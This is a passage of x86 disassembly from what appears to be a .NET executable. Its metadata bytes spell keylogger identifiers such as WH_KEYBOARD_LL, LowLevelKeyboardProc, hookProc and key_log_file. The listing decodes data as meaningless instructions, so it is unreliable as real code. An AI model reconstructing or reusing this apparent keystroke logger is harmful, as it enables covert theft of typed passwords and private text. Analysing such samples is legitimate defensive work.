  4025bf:	00 e8                	add    %ch,%al
  4025c1:	05 f0 02 08 00       	add    $0x802f0,%eax
  4025c6:	05 00 06 00 00       	add    $0x600,%eax
  4025cb:	00 10                	add    %dl,(%eax)
  4025cd:	00 26                	add    %ah,(%esi)
  4025cf:	05 63 05 19 00       	add    $0x190563,%eax
  4025d4:	0a 00                	or     (%eax),%al
  4025d6:	0e                   	push   %cs
  4025d7:	00 03                	add    %al,(%ebx)
  4025d9:	01 00                	add    %eax,(%eax)
  4025db:	00 4e 00             	add    %cl,0x0(%esi)
  4025de:	00 00                	add    %al,(%eax)
  4025e0:	35 00 0c 00 12       	xor    $0x12000c00,%eax
  4025e5:	00 16                	add    %dl,(%esi)
  4025e7:	00 0d 01 11 01 11    	add    %cl,0x11011101
  4025ed:	00 4e 01             	add    %cl,0x1(%esi)
  4025f0:	11 01                	adc    %eax,(%ecx)
  4025f2:	16                   	push   %ss
  4025f3:	00 b3 04 11 01 16    	add    %dh,0x16011104(%ebx)
  4025f9:	00 16                	add    %dl,(%esi)
  4025fb:	01 11                	add    %edx,(%ecx)
  4025fd:	01 51 80             	add    %edx,-0x80(%ecx)
  402600:	1a 00                	sbb    (%eax),%al
  402602:	14 01                	adc    $0x1,%al
  402604:	51                   	push   %ecx
  402605:	80 26 00             	andb   $0x0,(%esi)
  402608:	14 01                	adc    $0x1,%al
  40260a:	01 00                	add    %eax,(%eax)
  40260c:	6c                   	insb   (%dx),%es:(%edi)
  40260d:	00 17                	add    %dl,(%edi)
  40260f:	01 11                	add    %edx,(%ecx)
  402611:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  402614:	ac                   	lods   %ds:(%esi),%al
  402615:	00 16                	add    %dl,(%esi)
  402617:	00 00                	add    %al,(%eax)
  402619:	01 11                	add    %edx,(%ecx)
  40261b:	01 11                	add    %edx,(%ecx)
  40261d:	00 95 03 1b 01 11    	add    %dl,0x11011b03(%ebp)
  402623:	00 79 01             	add    %bh,0x1(%ecx)
  402626:	1f                   	pop    %ds
  402627:	01 50 20             	add    %edx,0x20(%eax)
  40262a:	00 00                	add    %al,(%eax)
  40262c:	00 00                	add    %al,(%eax)
  40262e:	96                   	xchg   %eax,%esi
  40262f:	00 ab 03 23 01 01    	add    %ch,0x1012303(%ebx)
  402635:	00 c5                	add    %al,%ch
  402637:	20 00                	and    %al,(%eax)
  402639:	00 00                	add    %al,(%eax)
  40263b:	00 86 18 d8 04 06    	add    %al,0x604d818(%esi)
  402641:	00 02                	add    %al,(%edx)
  402643:	00 d0                	add    %dl,%al
  402645:	20 00                	and    %al,(%eax)
  402647:	00 00                	add    %al,(%eax)
  402649:	00 91 18 de 04 3f    	add    %dl,0x3f04de18(%ecx)
  40264f:	00 02                	add    %al,(%edx)
  402651:	00 20                	add    %ah,(%eax)
  402653:	21 00                	and    %eax,(%eax)
  402655:	00 00                	add    %al,(%eax)
  402657:	00 86 00 3f 00 06    	add    %al,0x6003f00(%esi)
  40265d:	00 02                	add    %al,(%edx)
  40265f:	00 90 21 00 00 00    	add    %dl,0x21(%eax)
  402665:	00 86 18 d8 04 06    	add    %al,0x604d818(%esi)
  40266b:	00 02                	add    %al,(%edx)
  40266d:	00 00                	add    %al,(%eax)
  40266f:	00 00                	add    %al,(%eax)
  402671:	00 80 00 91 20 93    	add    %al,-0x6cdf6f00(%eax)
  402677:	06                   	push   %es
  402678:	29 01                	sub    %eax,(%ecx)
  40267a:	02 00                	add    (%eax),%al
  40267c:	00 00                	add    %al,(%eax)
  40267e:	00 00                	add    %al,(%eax)
  402680:	80 00 91             	addb   $0x91,(%eax)
  402683:	20 a4 06 32 01 06 00 	and    %ah,0x60132(%esi,%eax,1)
  40268a:	00 00                	add    %al,(%eax)
  40268c:	00 00                	add    %al,(%eax)
  40268e:	80 00 91             	addb   $0x91,(%eax)
  402691:	20 ef                	and    %ch,%bh
  402693:	06                   	push   %es
  402694:	3a 01                	cmp    (%ecx),%al
  402696:	0a 00                	or     (%eax),%al
  402698:	00 00                	add    %al,(%eax)
  40269a:	00 00                	add    %al,(%eax)
  40269c:	80 00 96             	addb   $0x96,(%eax)
  40269f:	20 c5                	and    %al,%ch
  4026a1:	01 3f                	add    %edi,(%edi)
  4026a3:	01 0b                	add    %ecx,(%ebx)
  4026a5:	00 98 21 00 00 00    	add    %bl,0x21(%eax)
  4026ab:	00 86 00 34 03 06    	add    %al,0x6033400(%esi)
  4026b1:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4026b4:	c4 21                	les    (%ecx),%esp
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	96                   	xchg   %eax,%esi
  4026bb:	00 63 00             	add    %ah,0x0(%ebx)
  4026be:	45                   	inc    %ebp
  4026bf:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  4026c2:	0c 23                	or     $0x23,%al
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	86 18                	xchg   %bl,(%eax)
  4026ca:	d8 04 06             	fadds  (%esi,%eax,1)
  4026cd:	00 0f                	add    %cl,(%edi)
  4026cf:	00 26                	add    %ah,(%esi)
  4026d1:	23 00                	and    (%eax),%eax
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	00 91 18 de 04 3f    	add    %dl,0x3f04de18(%ecx)
  4026db:	00 0f                	add    %cl,(%edi)
  4026dd:	00 46 23             	add    %al,0x23(%esi)
  4026e0:	00 00                	add    %al,(%eax)
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	83 18 d8             	sbbl   $0xffffffd8,(%eax)
  4026e7:	04 06                	add    $0x6,%al
  4026e9:	00 0f                	add    %cl,(%edi)
  4026eb:	00 4e 23             	add    %cl,0x23(%esi)
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	00 00                	add    %al,(%eax)
  4026f2:	93                   	xchg   %eax,%ebx
  4026f3:	08 63 04             	or     %ah,0x4(%ebx)
  4026f6:	4c                   	dec    %esp
  4026f7:	01 0f                	add    %ecx,(%edi)
  4026f9:	00 7a 23             	add    %bh,0x23(%edx)
  4026fc:	00 00                	add    %al,(%eax)
  4026fe:	00 00                	add    %al,(%eax)
  402700:	93                   	xchg   %eax,%ebx
  402701:	08 61 01             	or     %ah,0x1(%ecx)
  402704:	51                   	push   %ecx
  402705:	01 0f                	add    %ecx,(%edi)
  402707:	00 81 23 00 00 00    	add    %al,0x23(%ecx)
  40270d:	00 93 08 6d 01 56    	add    %dl,0x56016d08(%ebx)
  402713:	01 0f                	add    %ecx,(%edi)
  402715:	00 00                	add    %al,(%eax)
  402717:	00 00                	add    %al,(%eax)
  402719:	00 03                	add    %al,(%ebx)
  40271b:	00 86 18 d8 04 5c    	add    %al,0x5c04d818(%esi)
  402721:	01 10                	add    %edx,(%eax)
  402723:	00 00                	add    %al,(%eax)
  402725:	00 00                	add    %al,(%eax)
  402727:	00 03                	add    %al,(%ebx)
  402729:	00 c6                	add    %al,%dh
  40272b:	01 c4                	add    %eax,%esp
  40272d:	00 62 01             	add    %ah,0x1(%edx)
  402730:	12 00                	adc    (%eax),%al
  402732:	00 00                	add    %al,(%eax)
  402734:	00 00                	add    %al,(%eax)
  402736:	03 00                	add    (%eax),%eax
  402738:	c6 01 bf             	movb   $0xbf,(%ecx)
  40273b:	00 69 01             	add    %ch,0x1(%ecx)
  40273e:	15 00 00 00 00       	adc    $0x0,%eax
  402743:	00 03                	add    %al,(%ebx)
  402745:	00 c6                	add    %al,%dh
  402747:	01 b5 00 74 01 1a    	add    %esi,0x1a017400(%ebp)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 01                	add    %al,(%ecx)
  402751:	00 a9 05 00 00 01    	add    %ch,0x1000005(%ecx)
  402757:	00 2d 03 00 00 02    	add    %ch,0x2000003
  40275d:	00 24 03             	add    %ah,(%ebx,%eax,1)
  402760:	00 00                	add    %al,(%eax)
  402762:	03 00                	add    (%eax),%eax
  402764:	94                   	xchg   %eax,%esp
  402765:	00 00                	add    %al,(%eax)
  402767:	00 04 00             	add    %al,(%eax,%eax,1)
  40276a:	72 00                	jb     0x40276c
  40276c:	00 00                	add    %al,(%eax)
  40276e:	01 00                	add    %eax,(%eax)
  402770:	2d 03 00 00 02       	sub    $0x2000003,%eax
  402775:	00 9e 00 00 00 03    	add    %bl,0x3000000(%esi)
  40277b:	00 82 03 00 00 04    	add    %al,0x4000003(%edx)
  402781:	00 7b 03             	add    %bh,0x3(%ebx)
  402784:	00 00                	add    %al,(%eax)
  402786:	01 00                	add    %eax,(%eax)
  402788:	1f                   	pop    %ds
  402789:	01 00                	add    %eax,(%eax)
  40278b:	00 01                	add    %al,(%ecx)
  40278d:	00 02                	add    %al,(%edx)
  40278f:	06                   	push   %es
  402790:	00 00                	add    %al,(%eax)
  402792:	01 00                	add    %eax,(%eax)
  402794:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402795:	00 00                	add    %al,(%eax)
  402797:	00 02                	add    %al,(%edx)
  402799:	00 82 03 00 00 03    	add    %al,0x3000003(%edx)
  40279f:	00 7b 03             	add    %bh,0x3(%ebx)
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	01 00                	add    %eax,(%eax)
  4027a6:	b8 02 00 00 01       	mov    $0x1000002,%eax
  4027ab:	00 16                	add    %dl,(%esi)
  4027ad:	06                   	push   %es
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	02 00                	add    (%eax),%al
  4027b2:	8d 00                	lea    (%eax),%eax
  4027b4:	00 00                	add    %al,(%eax)
  4027b6:	01 00                	add    %eax,(%eax)
  4027b8:	9e                   	sahf
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	00 02                	add    %al,(%edx)
  4027bd:	00 82 03 00 00 03    	add    %al,0x3000003(%edx)
  4027c3:	00 7b 03             	add    %bh,0x3(%ebx)
  4027c6:	00 00                	add    %al,(%eax)
  4027c8:	01 00                	add    %eax,(%eax)
  4027ca:	9e                   	sahf
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	00 02                	add    %al,(%edx)
  4027cf:	00 82 03 00 00 03    	add    %al,0x3000003(%edx)
  4027d5:	00 7b 03             	add    %bh,0x3(%ebx)
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	04 00                	add    $0x0,%al
  4027dc:	24 03                	and    $0x3,%al
  4027de:	00 00                	add    %al,(%eax)
  4027e0:	05 00 16 06 00       	add    $0x61600,%eax
  4027e5:	00 01                	add    %al,(%ecx)
  4027e7:	00 58 06             	add    %bl,0x6(%eax)
  4027ea:	09 00                	or     %eax,(%eax)
  4027ec:	d8 04 01             	fadds  (%ecx,%eax,1)
  4027ef:	00 11                	add    %dl,(%ecx)
  4027f1:	00 d8                	add    %bl,%al
  4027f3:	04 06                	add    $0x6,%al
  4027f5:	00 19                	add    %bl,(%ecx)
  4027f7:	00 d8                	add    %bl,%al
  4027f9:	04 0a                	add    $0xa,%al
  4027fb:	00 29                	add    %ch,(%ecx)
  4027fd:	00 d8                	add    %bl,%al
  4027ff:	04 10                	add    $0x10,%al
  402801:	00 81 00 d8 04 15    	add    %al,0x1504d800(%ecx)
  402807:	00 89 00 d8 04 06    	add    %cl,0x604d800(%ecx)
  40280d:	00 91 00 d8 04 06    	add    %dl,0x604d800(%ecx)
  402813:	00 b1 00 d8 04 1b    	add    %dh,0x1b04d800(%ecx)
  402819:	00 b9 00 14 07 21    	add    %bh,0x21071400(%ecx)
  40281f:	00 b9 00 08 06 27    	add    %bh,0x27060800(%ecx)
  402825:	00 c1                	add    %al,%cl
  402827:	00 8e 06 2d 00 e1    	add    %cl,-0x1effd2fa(%esi)
  40282d:	00 2a                	add    %ch,(%edx)
  40282f:	01 38                	add    %edi,(%eax)
  402831:	00 e9                	add    %ch,%cl
  402833:	00 18                	add    %bl,(%eax)
  402835:	04 3f                	add    $0x3f,%al
  402837:	00 e1                	add    %ah,%cl
  402839:	00 77 06             	add    %dh,0x6(%edi)
  40283c:	43                   	inc    %ebx
  40283d:	00 f1                	add    %dh,%cl
  40283f:	00 39                	add    %bh,(%ecx)
  402841:	06                   	push   %es
  402842:	49                   	dec    %ecx
  402843:	00 31                	add    %dh,(%ecx)
  402845:	00 d8                	add    %bl,%al
  402847:	04 06                	add    $0x6,%al
  402849:	00 e9                	add    %ch,%cl
  40284b:	00 f5                	add    %dh,%ch
  40284d:	02 4e 00             	add    0x0(%esi),%cl
  402850:	f9                   	stc
  402851:	00 ba 03 52 00 f9    	add    %bh,-0x6ffadfd(%edx)
  402857:	00 3d 01 57 00 f1    	add    %bh,0xf1005701
  40285d:	00 08                	add    %cl,(%eax)
  40285f:	03 5b 00             	add    0x0(%ebx),%ebx
  402862:	09 01                	or     %eax,(%ecx)
  402864:	fb                   	sti
  402865:	05 62 00 09 01       	add    $0x1090062,%eax
  40286a:	fb                   	sti
  40286b:	06                   	push   %es
  40286c:	67 00 19             	add    %bl,(%bx,%di)
  40286f:	01 73 05             	add    %esi,0x5(%ebx)
  402872:	6e                   	outsb  %ds:(%esi),(%dx)
  402873:	00 29                	add    %ch,(%ecx)
  402875:	01 fb                	add    %edi,%ebx
  402877:	05 62 00 29 01       	add    $0x1290062,%eax
  40287c:	ea 06 75 00 29 01 91 	ljmp   $0x9101,$0x29007506
  402883:	05 7b 00 31 01       	add    $0x131007b,%eax
  402888:	8f 04 83             	pop    (%ebx,%eax,4)
  40288b:	00 39                	add    %bh,(%ecx)
  40288d:	01 c4                	add    %eax,%esp
  40288f:	06                   	push   %es
  402890:	88 00                	mov    %al,(%eax)
  402892:	39 01                	cmp    %eax,(%ecx)
  402894:	af                   	scas   %es:(%edi),%eax
  402895:	02 8f 00 49 01 45    	add    0x45014900(%edi),%cl
  40289b:	04 ac                	add    $0xac,%al
  40289d:	00 49 01             	add    %cl,0x1(%ecx)
  4028a0:	1d 06 af 00 51       	sbb    $0x5100af06,%eax
  4028a5:	01 e9                	add    %ebp,%ecx
  4028a7:	00 b4 00 61 01 9f 05 	add    %dh,0x59f0161(%eax,%eax,1)
  4028ae:	bd 00 29 01 97       	mov    $0x97012900,%ebp
  4028b3:	01 c5                	add    %eax,%ebp
  4028b5:	00 71 01             	add    %dh,0x1(%ecx)
  4028b8:	89 01                	mov    %eax,(%ecx)
  4028ba:	06                   	push   %es
  4028bb:	00 51 00             	add    %dl,0x0(%ecx)
  4028be:	a9 00 57 00 79       	test   $0x79005700,%eax
  4028c3:	01 d8                	add    %ebx,%eax
  4028c5:	04 cc                	add    $0xcc,%al
  4028c7:	00 41 00             	add    %al,0x0(%ecx)
  4028ca:	ca 04 d2             	lret   $0xd204
  4028cd:	00 59 00             	add    %bl,0x0(%ecx)
  4028d0:	6b 06 d7             	imul   $0xffffffd7,(%esi),%eax
  4028d3:	00 81 01 a1 03 db    	add    %al,-0x24fc5eff(%ecx)
  4028d9:	00 31                	add    %dh,(%ecx)
  4028db:	00 e7                	add    %ah,%bh
  4028dd:	02 57 00             	add    0x0(%edi),%dl
  4028e0:	89 01                	mov    %eax,(%ecx)
  4028e2:	29 06                	sub    %eax,(%esi)
  4028e4:	e0 00                	loopne 0x4028e6
  4028e6:	b9 00 08 06 e5       	mov    $0xe5060800,%ecx
  4028eb:	00 49 00             	add    %cl,0x0(%ecx)
  4028ee:	d6                   	salc
  4028ef:	01 10                	add    %edx,(%eax)
  4028f1:	00 59 00             	add    %bl,0x0(%ecx)
  4028f4:	85 06                	test   %eax,(%esi)
  4028f6:	ec                   	in     (%dx),%al
  4028f7:	00 61 00             	add    %ah,0x0(%ecx)
  4028fa:	8f 01                	pop    (%ecx)
  4028fc:	06                   	push   %es
  4028fd:	00 49 00             	add    %cl,0x0(%ecx)
  402900:	89 01                	mov    %eax,(%ecx)
  402902:	06                   	push   %es
  402903:	00 51 01             	add    %dl,0x1(%ecx)
  402906:	dd 06                	fldl   (%esi)
  402908:	f0 00 99 00 d8 04 f6 	lock add %bl,-0x9fb2800(%ecx)
  40290f:	00 08                	add    %cl,(%eax)
  402911:	00 14 00             	add    %dl,(%eax,%eax,1)
  402914:	07                   	pop    %es
  402915:	01 08                	add    %ecx,(%eax)
  402917:	00 18                	add    %bl,(%eax)
  402919:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40291c:	29 00                	sub    %eax,(%eax)
  40291e:	43                   	inc    %ebx
  40291f:	00 ac 01 2e 00 0b 00 	add    %ch,0xb002e(%ecx,%eax,1)
  402926:	84 01                	test   %al,(%ecx)
  402928:	2e 00 13             	add    %dl,%cs:(%ebx)
  40292b:	00 8d 01 2e 00 1b    	add    %cl,0x1b002e01(%ebp)
  402931:	00 ac 01 2e 00 23 00 	add    %ch,0x23002e(%ecx,%eax,1)
  402938:	b5 01                	mov    $0x1,%ch
  40293a:	49                   	dec    %ecx
  40293b:	00 43 00             	add    %al,0x0(%ebx)
  40293e:	ac                   	lods   %ds:(%esi),%al
  40293f:	01 a3 00 2b 00 fd    	add    %esp,-0x2ffd500(%ebx)
  402945:	01 a3 00 33 00 3f    	add    %esp,0x3f003300(%ebx)
  40294b:	02 a3 00 3b 00 3f    	add    0x3f003b00(%ebx),%ah
  402951:	02 98 00 9c 00 05    	add    0x5009c00(%eax),%bl
  402957:	00 01                	add    %al,(%ecx)
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 67 04             	add    %ah,0x4(%edi)
  40295e:	7a 01                	jp     0x402961
  402960:	00 00                	add    %al,(%eax)
  402962:	81 01 7f 01 02 00    	addl   $0x2017f,(%ecx)
  402968:	0f 00 03             	sldt   (%ebx)
  40296b:	00 02                	add    %al,(%edx)
  40296d:	00 10                	add    %dl,(%eax)
  40296f:	00 05 00 01 00 11    	add    %al,0x11000100
  402975:	00 05 00 65 03 58    	add    %al,0x58036500
  40297b:	03 00                	add    (%eax),%eax
  40297d:	01 0d 00 93 06 01    	add    %ecx,0x1069300
  402983:	00 00                	add    %al,(%eax)
  402985:	01 0f                	add    %ecx,(%edi)
  402987:	00 a4 06 01 00 00 01 	add    %ah,0x1000001(%esi,%eax,1)
  40298e:	11 00                	adc    %eax,(%eax)
  402990:	ef                   	out    %eax,(%dx)
  402991:	06                   	push   %es
  402992:	02 00                	add    (%eax),%al
  402994:	00 01                	add    %al,(%ecx)
  402996:	13 00                	adc    (%eax),%eax
  402998:	c5 01                	lds    (%ecx),%eax
  40299a:	01 00                	add    %eax,(%eax)
  40299c:	04 80                	add    $0x80,%al
	...
  4029ae:	4a                   	dec    %edx
  4029af:	04 00                	add    $0x0,%al
  4029b1:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4029bc:	00 00                	add    %al,(%eax)
  4029be:	fe 00                	incb   (%eax)
  4029c0:	45                   	inc    %ebp
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	00 00                	add    %al,(%eax)
  4029c5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4029d0:	00 00                	add    %al,(%eax)
  4029d2:	fe 00                	incb   (%eax)
  4029d4:	ae                   	scas   %es:(%edi),%al
  4029d5:	05 00 00 00 00       	add    $0x0,%eax
  4029da:	04 00                	add    $0x0,%al
	...
  4029e4:	00 00                	add    %al,(%eax)
  4029e6:	fe 00                	incb   (%eax)
  4029e8:	89 03                	mov    %eax,(%ebx)
	...
  4029f2:	01 00                	add    %eax,(%eax)
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	30 05 00 00 06 00    	xor    %al,0x60000
  4029fc:	04 00                	add    $0x0,%al
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	00 4d 69             	add    %cl,0x69(%ebp)
  402a03:	63 72 6f             	arpl   %esi,0x6f(%edx)
  402a06:	73 6f                	jae    0x402a77
  402a08:	66 74 2e             	data16 je 0x402a39
  402a0b:	57                   	push   %edi
  402a0c:	69 6e 33 32 00 3c 4d 	imul   $0x4d3c0032,0x33(%esi),%ebp
  402a13:	6f                   	outsl  %ds:(%esi),(%dx)
  402a14:	64 75 6c             	fs jne 0x402a83
  402a17:	65 3e 00 4b 45       	gs add %cl,%ds:0x45(%ebx)
  402a1c:	59                   	pop    %ecx
  402a1d:	5f                   	pop    %edi
  402a1e:	50                   	push   %eax
  402a1f:	52                   	push   %edx
  402a20:	45                   	inc    %ebp
  402a21:	53                   	push   %ebx
  402a22:	53                   	push   %ebx
  402a23:	45                   	inc    %ebp
  402a24:	44                   	inc    %esp
  402a25:	00 57 48             	add    %dl,0x48(%edi)
  402a28:	5f                   	pop    %edi
  402a29:	4b                   	dec    %ebx
  402a2a:	45                   	inc    %ebp
  402a2b:	59                   	pop    %ecx
  402a2c:	42                   	inc    %edx
  402a2d:	4f                   	dec    %edi
  402a2e:	41                   	inc    %ecx
  402a2f:	52                   	push   %edx
  402a30:	44                   	inc    %esp
  402a31:	5f                   	pop    %edi
  402a32:	4c                   	dec    %esp
  402a33:	4c                   	dec    %esp
  402a34:	00 53 79             	add    %dl,0x79(%ebx)
  402a37:	73 74                	jae    0x402aad
  402a39:	65 6d                	gs insl (%dx),%es:(%edi)
  402a3b:	2e 49                	cs dec %ecx
  402a3d:	4f                   	dec    %edi
  402a3e:	00 53 65             	add    %dl,0x65(%ebx)
  402a41:	74 55                	je     0x402a98
  402a43:	50                   	push   %eax
  402a44:	00 6d 73             	add    %ch,0x73(%ebp)
  402a47:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402a4a:	6c                   	insb   (%dx),%es:(%edi)
  402a4b:	69 62 00 4c 6f 77 4c 	imul   $0x4c776f4c,0x0(%edx),%esp
  402a52:	65 76 65             	gs jbe 0x402aba
  402a55:	6c                   	insb   (%dx),%es:(%edi)
  402a56:	4b                   	dec    %ebx
  402a57:	65 79 62             	gs jns 0x402abc
  402a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5b:	61                   	popa
  402a5c:	72 64                	jb     0x402ac2
  402a5e:	50                   	push   %eax
  402a5f:	72 6f                	jb     0x402ad0
  402a61:	63 00                	arpl   %eax,(%eax)
  402a63:	68 6f 6f 6b 50       	push   $0x506b6f6f
  402a68:	72 6f                	jb     0x402ad9
  402a6a:	63 00                	arpl   %eax,(%eax)
  402a6c:	5f                   	pop    %edi
  402a6d:	70 72                	jo     0x402ae1
  402a6f:	6f                   	outsl  %ds:(%esi),(%dx)
  402a70:	63 00                	arpl   %eax,(%eax)
  402a72:	74 68                	je     0x402adc
  402a74:	72 65                	jb     0x402adb
  402a76:	61                   	popa
  402a77:	64 49                	fs dec %ecx
  402a79:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  402a7d:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  402a84:	61 
  402a85:	6c                   	insb   (%dx),%es:(%edi)
  402a86:	75 65                	jne    0x402aed
  402a88:	4b                   	dec    %ebx
  402a89:	69 6e 64 00 6d 65 74 	imul   $0x74656d00,0x64(%esi),%ebp
  402a90:	68 6f 64 00 68       	push   $0x6800646f
  402a95:	49                   	dec    %ecx
  402a96:	6e                   	outsb  %ds:(%esi),(%dx)
  402a97:	73 74                	jae    0x402b0d
  402a99:	61                   	popa
  402a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  402a9b:	63 65 00             	arpl   %esp,0x0(%ebp)
  402a9e:	6e                   	outsb  %ds:(%esi),(%dx)
  402a9f:	43                   	inc    %ebx
  402aa0:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa1:	64 65 00 63 6f       	fs add %ah,%gs:0x6f(%ebx)
  402aa6:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  402aab:	74 5f                	je     0x402b0c
  402aad:	4d                   	dec    %ebp
  402aae:	65 73 73             	gs jae 0x402b24
  402ab1:	61                   	popa
  402ab2:	67 65 00 45 6e       	add    %al,%gs:0x6e(%di)
  402ab7:	64 49                	fs dec %ecx
  402ab9:	6e                   	outsb  %ds:(%esi),(%dx)
  402aba:	76 6f                	jbe    0x402b2b
  402abc:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
  402ac0:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  402ac7:	6f 6b 
  402ac9:	65 00 49 44          	add    %cl,%gs:0x44(%ecx)
  402acd:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  402ad4:	6c                   	insb   (%dx),%es:(%edi)
  402ad5:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402ad9:	6e                   	outsb  %ds:(%esi),(%dx)
  402ada:	74 69                	je     0x402b45
  402adc:	6d                   	insl   (%dx),%es:(%edi)
  402add:	65 54                	gs push %esp
  402adf:	79 70                	jns    0x402b51
  402ae1:	65 48                	gs dec %eax
  402ae3:	61                   	popa
  402ae4:	6e                   	outsb  %ds:(%esi),(%dx)
  402ae5:	64 6c                	fs insb (%dx),%es:(%edi)
  402ae7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402aeb:	74 54                	je     0x402b41
  402aed:	79 70                	jns    0x402b5f
  402aef:	65 46                	gs inc %esi
  402af1:	72 6f                	jb     0x402b62
  402af3:	6d                   	insl   (%dx),%es:(%edi)
  402af4:	48                   	dec    %eax
  402af5:	61                   	popa
  402af6:	6e                   	outsb  %ds:(%esi),(%dx)
  402af7:	64 6c                	fs insb (%dx),%es:(%edi)
  402af9:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  402afd:	6c                   	insb   (%dx),%es:(%edi)
  402afe:	65 00 6b 65          	add    %ch,%gs:0x65(%ebx)
  402b02:	79 5f                	jns    0x402b63
  402b04:	6c                   	insb   (%dx),%es:(%edi)
  402b05:	6f                   	outsl  %ds:(%esi),(%dx)
  402b06:	67 5f                	addr16 pop %edi
  402b08:	66 69 6c 65 00 63 75 	imul   $0x7563,0x0(%ebp,%eiz,2),%bp
  402b0f:	72 5f                	jb     0x402b70
  402b11:	66 69 6c 65 00 6e 65 	imul   $0x656e,0x0(%ebp,%eiz,2),%bp
  402b18:	77 5f                	ja     0x402b79
  402b1a:	66 69 6c 65 00 6c 70 	imul   $0x706c,0x0(%ebp,%eiz,2),%bp
  402b21:	46                   	inc    %esi
  402b22:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  402b29:	00 
  402b2a:	47                   	inc    %edi
  402b2b:	65 74 50             	gs je  0x402b7e
  402b2e:	72 6f                	jb     0x402b9f
  402b30:	63 65 73             	arpl   %esp,0x73(%ebp)
  402b33:	73 65                	jae    0x402b9a
  402b35:	73 42                	jae    0x402b79
  402b37:	79 4e                	jns    0x402b87
  402b39:	61                   	popa
  402b3a:	6d                   	insl   (%dx),%es:(%edi)
  402b3b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402b3f:	74 5f                	je     0x402ba0
  402b41:	46                   	inc    %esi
  402b42:	72 69                	jb     0x402bad
  402b44:	65 6e                	outsb  %gs:(%esi),(%dx)
  402b46:	64 6c                	fs insb (%dx),%es:(%edi)
  402b48:	79 4e                	jns    0x402b98
  402b4a:	61                   	popa
  402b4b:	6d                   	insl   (%dx),%es:(%edi)
  402b4c:	65 00 63 75          	add    %ah,%gs:0x75(%ebx)
  402b50:	72 5f                	jb     0x402bb1
  402b52:	6e                   	outsb  %ds:(%esi),(%dx)
  402b53:	61                   	popa
  402b54:	6d                   	insl   (%dx),%es:(%edi)
  402b55:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  402b5a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402b5e:	72 65                	jb     0x402bc5
  402b60:	00 67 65             	add    %ah,0x65(%edi)
  402b63:	74 5f                	je     0x402bc4
  402b65:	43                   	inc    %ebx
  402b66:	75 6c                	jne    0x402bd4
  402b68:	74 75                	je     0x402bdf
  402b6a:	72 65                	jb     0x402bd1
  402b6c:	00 73 65             	add    %dh,0x65(%ebx)
  402b6f:	74 5f                	je     0x402bd0
  402b71:	43                   	inc    %ebx
  402b72:	75 6c                	jne    0x402be0
  402b74:	74 75                	je     0x402beb
  402b76:	72 65                	jb     0x402bdd
  402b78:	00 72 65             	add    %dh,0x65(%edx)
  402b7b:	73 6f                	jae    0x402bec
  402b7d:	75 72                	jne    0x402bf1
  402b7f:	63 65 43             	arpl   %esp,0x43(%ebp)
  402b82:	75 6c                	jne    0x402bf0
  402b84:	74 75                	je     0x402bfb
  402b86:	72 65                	jb     0x402bed
  402b88:	00 43 6c             	add    %al,0x6c(%ebx)
  402b8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b8c:	73 65                	jae    0x402bf3
  402b8e:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402b92:	70 6f                	jo     0x402c03
  402b94:	73 65                	jae    0x402bfb
  402b96:	00 43 72             	add    %al,0x72(%ebx)
  402b99:	65 61                	gs popa
  402b9b:	74 65                	je     0x402c02
  402b9d:	00 4d 75             	add    %cl,0x75(%ebp)
  402ba0:	6c                   	insb   (%dx),%es:(%edi)
  402ba1:	74 69                	je     0x402c0c
  402ba3:	63 61 73             	arpl   %esp,0x73(%ecx)
  402ba6:	74 44                	je     0x402bec
  402ba8:	65 6c                	gs insb (%dx),%es:(%edi)
  402baa:	65 67 61             	gs addr16 popa
  402bad:	74 65                	je     0x402c14
  402baf:	00 45 64             	add    %al,0x64(%ebp)
  402bb2:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  402bb9:	77 
  402bba:	73 61                	jae    0x402c1d
  402bbc:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  402bc0:	74 61                	je     0x402c23
  402bc2:	74 65                	je     0x402c29
  402bc4:	00 47 65             	add    %al,0x65(%edi)
  402bc7:	74 41                	je     0x402c0a
  402bc9:	73 79                	jae    0x402c44
